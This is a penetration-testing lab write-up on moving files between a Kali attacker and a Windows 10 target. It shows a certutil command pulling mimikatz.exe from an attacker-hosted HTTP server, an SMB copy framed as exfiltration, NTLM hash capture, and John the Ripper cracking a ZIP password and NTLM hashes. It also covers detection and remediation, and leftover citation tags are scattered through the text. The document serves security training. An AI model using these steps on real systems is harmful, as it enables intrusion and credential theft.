# File Transfer Techniques

## Objective

Demonstrate multiple file transfer techniques used during penetration testing, including transferring files between Kali Linux and Windows systems, SMB-based file sharing, NTLM hash capture, and password recovery.

## Lab Environment

- Attacker Machine: Kali Linux
- Target Machine: Windows 10
- Tools Used:
  - Python HTTP Server
  - Certutil
  - Netcat
  - Impacket SMB Server
  - John the Ripper
- Communication Methods:
  - HTTP
  - SMB

## File Transfer Overview

File transfer is a critical post-exploitation activity used to move tools, payloads, and collected data between attacker and target systems.

Penetration testers often leverage native operating system utilities and network protocols to transfer files while minimizing detection.

## HTTP File Transfer

A Python HTTP server was used to transfer files from Kali Linux to the Windows target. :contentReference[oaicite:1]{index=1}

### Commands Used

```bash
cd /usr/share/windows-resources/mimikatz/x64

python3 -m http.server 80
```

### Windows Download

```cmd
certutil -urlcache -f http://<Kali-IP>/mimikatz.exe mimikatz.exe
```

### Findings

- Mimikatz executable transferred successfully.
- File download completed using a native Windows utility.
- HTTP-based file transfer confirmed.

## Reverse Shell Access

A reverse shell was established to interact with the Windows target system. :contentReference[oaicite:2]{index=2}

### Findings

- Remote access obtained.
- File system interaction became possible.
- Target files were accessible for transfer operations.

## SMB File Transfer

An SMB share was created on Kali Linux using Impacket SMB Server. :contentReference[oaicite:3]{index=3}

### Commands Used

```bash
impacket-smbserver tools $(pwd) -smb2support
```

### Windows Transfer

```cmd
copy Test.zip \\<Kali-IP>\tools\Test.zip
```

### Findings

- File transferred successfully from Windows to Kali.
- SMB share accessed successfully.
- File exfiltration scenario demonstrated.

## NTLM Authentication Capture

While accessing the SMB share, NTLM authentication information was captured. :contentReference[oaicite:4]{index=4}

### Findings

- NTLM authentication hash observed.
- Windows user authentication details captured.
- Credential harvesting opportunity identified.

## ZIP Password Recovery

A password-protected ZIP archive was transferred and analyzed using John the Ripper. :contentReference[oaicite:5]{index=5}

### Commands Used

```bash
zip2john Test.zip > crack.txt

john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
```

### Findings

- ZIP archive hash extracted.
- Password successfully recovered.
- Password identified as:

```text
princess
```

## NTLM Password Recovery

The captured NTLM hash was exported and analyzed using John the Ripper. :contentReference[oaicite:6]{index=6}

### Commands Used

```bash
john --wordlist=password.txt NThash.txt
```

### Findings

- NTLM hash processed successfully.
- Windows user password recovered.
- Credential exposure confirmed.

## Attack Workflow

1. Host tools using a Python HTTP server.
2. Transfer files to Windows using Certutil.
3. Establish remote access through a reverse shell.
4. Create an SMB share on Kali Linux.
5. Transfer files from Windows to Kali.
6. Capture NTLM authentication traffic.
7. Extract ZIP password hash.
8. Recover ZIP password using John the Ripper.
9. Recover NTLM credentials using John the Ripper.

## Detection Opportunities

Security teams can identify file transfer activity through:

- Certutil file downloads
- SMB file transfer activity
- NTLM authentication events
- Reverse shell connections
- Unexpected file exfiltration
- John the Ripper execution
- Endpoint Detection and Response (EDR) alerts
- Suspicious outbound connections

## MITRE ATT&CK Mapping

| Technique ID | Technique |
|-------------|-----------|
| T1105 | Ingress Tool Transfer |
| T1048 | Exfiltration Over Alternative Protocol |
| T1021.002 | SMB/Windows Admin Shares |
| T1003 | OS Credential Dumping |
| T1110 | Brute Force |
| T1071 | Application Layer Protocol |

## Security Impact

Successful exploitation may lead to:

- Unauthorized file transfer
- Data exfiltration
- Credential exposure
- Password recovery attacks
- Lateral movement opportunities
- Privilege escalation opportunities

## Remediation

- Monitor Certutil usage.
- Restrict SMB access where possible.
- Enforce strong password policies.
- Disable unnecessary file sharing services.
- Monitor outbound file transfers.
- Enable EDR solutions.
- Detect credential harvesting attempts.
- Implement network segmentation.

## Tools Used

- Python HTTP Server
- Certutil
- Netcat
- Impacket SMB Server
- John the Ripper
- Kali Linux
- Windows 10
- Mimikatz

## Key Learning

This lab demonstrated multiple file transfer techniques commonly used during penetration testing and post-exploitation activities.

The exercise reinforced concepts related to HTTP file transfers, SMB-based file sharing, credential exposure through NTLM authentication, password recovery using John the Ripper, and defensive detection opportunities.

Additionally, the lab highlighted the importance of monitoring file transfer mechanisms, authentication events, and credential-related attacks within enterprise environments.

## Disclaimer

This assessment was conducted in a controlled lab environment for educational and ethical security testing purposes only.